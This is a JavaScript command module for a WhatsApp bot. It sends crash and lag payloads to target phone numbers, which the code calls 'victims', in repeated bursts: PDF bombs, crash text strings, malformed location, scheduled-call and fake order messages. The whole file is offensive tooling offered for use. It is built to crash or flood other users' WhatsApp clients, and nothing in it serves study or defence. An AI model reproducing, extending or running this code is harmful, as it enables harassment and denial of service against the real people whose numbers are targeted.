const { keith } = require("../keizzah/keith");
const { delay, loading, react } = require("../keizzah/utils");
const moment = require("moment-timezone");
const conf = require("../set.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys"); // Updated to latest Baileys package

// bug database
const { bugtext1 } = require("../keizzah/bugs/bugtext1");
const { bugtext2 } = require("../keizzah/bugs/bugtext2");
const { bugtext3 } = require("../keizzah/bugs/bugtext3");
const { bugtext4 } = require("../keizzah/bugs/bugtext4");
const { bugtext5 } = require("../keizzah/bugs/bugtext5");
const { bugtext6 } = require("../keizzah/bugs/bugtext6");
const { bugpdf } = require("../keizzah/bugs/bugpdf.js");

const category = "Bug-cmds";
const reaction = "🤯";

const mess = {};
mess.prem = "You are not authorised to use this command!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,15}$/; // Extended for international numbers

const timewisher = time => {
    const hour = parseInt(time.split(":")[0], 10);
    if (hour >= 23 || hour < 5) return `Good Night 🌆`;
    if (hour >= 19) return `Good Evening 🌆`;
    if (hour >= 15) return `Good Afternoon 🌅`;
    return `Good Morning 🌄`;
};

// --- Helper Functions ---

async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            await repondre(`${victims[i]} is not a valid phone number`);
            continue;
        }
        const victim = victims[i].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        for (let j = 0; j < amount; j++) {
            try {
                const message = generateWAMessageFromContent(
                    victim,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                await zk.relayMessage(
                    victim,
                    message.message,
                    { messageId: message.key.id }
                );
            } catch (e) {
                await repondre(`Error sending bugs to ${victims[i]}: ${e.message}`);
                console.error(`Error sending bugs to ${victim}:`, e);
                break;
            }
            await delay(3000);
        }
        if (victims.length > 1)
            await repondre(`${amount} bugs sent to ${victims[i]} successfully.`);
        await delay(5000);
    }
    await repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}`);
}

async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            await repondre(`${victims[i]} is not a valid phone number`);
            continue;
        }
        const victim = victims[i].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        for (let j = 0; j < amount; j++) {
            try {
                await zk.sendMessage(victim, bug);
            } catch (e) {
                await repondre(`Error sending bugs to ${victims[i]}: ${e.message}`);
                console.error(`Error sending bugs to ${victim}:`, e);
                break;
            }
            await delay(3000);
        }
        if (victims.length > 1)
            await repondre(`${amount} bugs sent to ${victims[i]} successfully.`);
        await delay(5000);
    }
    await repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}`);
}

// -- Command Definitions --

const menuCmd = {
    nomCom: "🐛",
    categorie: category,
    reaction: reaction
};

keith(menuCmd, async (dest, zk, commandOptions) => {
    const { ms, repondre } = commandOptions;
    const mono = "```";
    const time = moment().tz(conf.TZ).format("HH:mm:ss");
    const versions = ["v1", "v2"];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const menuImage = fs.readFileSync(
        path.resolve(path.join(__dirname, "..", "media", "deleted-message.jpg"))
    );
    const tumbUrl = "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
    let menu = `${mono}Hello ${ms.pushName}\n${timewisher(time)}\n\n\n\n┗❏${mono}`;
    const sendOpts = { quoted: ms };
    const imageMsg = {
        image: menuImage,
        caption: menu
    };
    if (version === "v2") {
        imageMsg.contextInfo = {
            mentionedJid: [ms.key.remoteJid],
            forwardingScore: 9999999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: `${conf.BOT}`,
                body: `Bot Created By ${conf.OWNER_NAME}`,
                thumbnail: menuImage,
                thumbnailUrl: tumbUrl,
                previewType: "PHOTO",
                sourceUrl: "https://whatsapp.com/channel/0029VaePv7T72WTq4R6Pxr0t",
                mediaType: 1
            }
        };
    }
    await zk.sendMessage(dest, imageMsg, sendOpts);
});

// bug (PDF bomb)
keith({
    nomCom: "bug",
    categorie: category,
    reaction: reaction
}, async (dest, zk, commandOptions) => {
    const { ms, repondre, superUser } = commandOptions;
    if (!superUser) return await repondre(mess.prem);
    await loading(dest, zk);

    for (let i = 0; i < 25; i++) {
        try {
            await zk.sendMessage(dest, bugpdf, { quoted: ms });
        } catch (e) {
            await repondre("An error occurred while sending bug PDF.");
            console.error("PDF bug error:", e);
            break;
        }
        await delay(1200);
    }
    await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
});

// crash command
keith({
    nomCom: "crash",
    categorie: category,
    reaction: reaction
}, async (dest, zk, commandOptions) => {
    const { ms, repondre, superUser } = commandOptions;
    if (!superUser) return await repondre(mess.prem);
    await loading(dest, zk);
    try {
        for (let i = 0; i < 10; i++) {
            await repondre(bugtext6);
        }
    } catch (e) {
        await repondre("An error occurred sending bugs");
        console.error("Crash bug error:", e);
    }
});

// loccrash command
keith({
    nomCom: "loccrash",
    categorie: category,
    reaction: "🔖"
}, async (dest, zk, commandOptions) => {
    const { ms, repondre, superUser } = commandOptions;
    if (!superUser) return await repondre(mess.prem);
    await loading(dest, zk);

    for (let i = 0; i < 20; i++) {
        for (let j = 0; j < 3; j++) {
            await zk.sendMessage(dest, {
                location: {
                    degreesLatitude: -6.28282828,
                    degreesLongitude: -1.2828,
                    name: "BRUX0N3RD\n"
                }
            }, { quoted: ms });
            await delay(400);
        }
    }
    await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
});

// crashbug command
keith({
    nomCom: "crashbug",
    categorie: category,
    reaction: reaction
}, async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
    if (!superUser) return await repondre(mess.prem);
    if (!arg[0])
        return await repondre(
            `Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${conf.NUMERO_OWNER} or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(",")[0]}`
        );
    await loading(dest, zk);
    let amount = 30;
    let victims = [];
    const bug = bugpdf;
    if (arg.length === 1) {
        victims.push(arg[0]);
    } else {
        amount = parseInt(arg.join("").split("|")[0].trim());
        victims = arg.join("").split("|")[1]?.split(",").map(x => x.trim()).filter(Boolean) || [];
        if (isNaN(amount)) return await repondre(`Amount must be a valid integer between 1-${conf.BOOM_MESSAGE_LIMIT}`);
        if (!victims.length) return await repondre("No victims specified");
    }
    await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
    try {
        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
    } catch (e) {
        await repondre("An error occurred");
        console.error(e);
        await react(dest, zk, ms, "⚠️");
    }
    await react(dest, zk, ms, "✅");
});

// -- Generic Bug Command Generator --
const bugTypes = [
    {
        nomCom: "amountbug",
        text: bugtext1,
        defaultAmount: 5
    },
    {
        nomCom: "pmbug",
        text: bugtext1,
        defaultAmount: 30
    },
    {
        nomCom: "delaybug",
        text: bugtext2,
        defaultAmount: 30
    },
    {
        nomCom: "docubug",
        text: bugtext1,
        defaultAmount: 15
    },
    {
        nomCom: "unlimitedbug",
        text: bugtext3,
        defaultAmount: 30
    },
    {
        nomCom: "bombug",
        text: bugtext4,
        defaultAmount: 30
    },
    {
        nomCom: "lagbug",
        text: bugtext2,
        defaultAmount: 30
    },
    {
        nomCom: "trollybug",
        text: bugtext5,
        defaultAmount: 15,
        isTrolly: true
    }
];

for (const bugType of bugTypes) {
    keith({
        nomCom: bugType.nomCom,
        categorie: category,
        reaction: reaction
    }, async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);

        if (!arg[0])
            return await repondre(
                `Use ${prefixe}${bugType.nomCom} amount | numbers\n> Example ${prefixe}${bugType.nomCom} ${bugType.defaultAmount} |${conf.NUMERO_OWNER} or ${prefixe}${bugType.nomCom} ${conf.NUMERO_OWNER.split(",")[0]}`
            );

        await loading(dest, zk);
        const text = arg.join("");
        let amount = bugType.defaultAmount;
        let victims = [];
        let bug;
        if (bugType.isTrolly) {
            bug = {
                orderMessage: {
                    orderId: "599519108102353",
                    thumbnail: fs.readFileSync(path.resolve(path.join(__dirname, "..", "media", "deleted-message.jpg"))),
                    itemCount: 1999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: `${conf.BOT}`,
                    orderTitle: " TROLLY BUG ",
                    sellerJid: "263785028126@s.whatsapp.net",
                    token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
                }
            };
        } else if (bugType.nomCom === "amountbug") {
            amount = parseInt(arg[0]);
            if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
                return await repondre(`Use a valid integer between 1-${conf.BOOM_MESSAGE_LIMIT}`);
            const victim = ms.key.remoteJid;
            bug = {
                scheduledCallCreationMessage: {
                    callType: "2",
                    scheduledTimestampMs: `${moment().tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                    title: bugType.text
                }
            };
            for (let i = 0; i < amount; i++) {
                try {
                    const message = generateWAMessageFromContent(
                        victim,
                        proto.Message.fromObject(bug),
                        { userJid: dest, quoted: ms }
                    );
                    await zk.relayMessage(
                        victim,
                        message.message,
                        { messageId: message.key.id }
                    );
                } catch (e) {
                    await repondre(`An error occurred while sending bugs`);
                    console.error("amountbug:", e);
                    return;
                }
                await delay(3000);
            }
            await repondre(`*Successfully sent ${amount} bugs. Please pause for 3 minutes*`);
            await react(dest, zk, ms, "✅");
            return;
        } else {
            bug = {
                scheduledCallCreationMessage: {
                    callType: "2",
                    scheduledTimestampMs: `${moment().tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
                    title: bugType.text
                }
            };
        }

        if (arg.length === 1) {
            victims.push(arg[0]);
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (amount > conf.BOOM_MESSAGE_LIMIT || isNaN(amount) || amount < 1)
                return await repondre(`Amount must be a valid integer between 1-${conf.BOOM_MESSAGE_LIMIT}`);
            victims = (text.split("|")[1] || "")
                .split(",")
                .map(x => x.trim())
                .filter(Boolean);
            if (!victims.length) return await repondre("No victims specified");
        }
        await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
        try {
            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
        } catch (e) {
            await repondre("An error occurred");
            console.error(e);
            await react(dest, zk, ms, "⚠️");
        }
        await react(dest, zk, ms, "✅");
    });
}
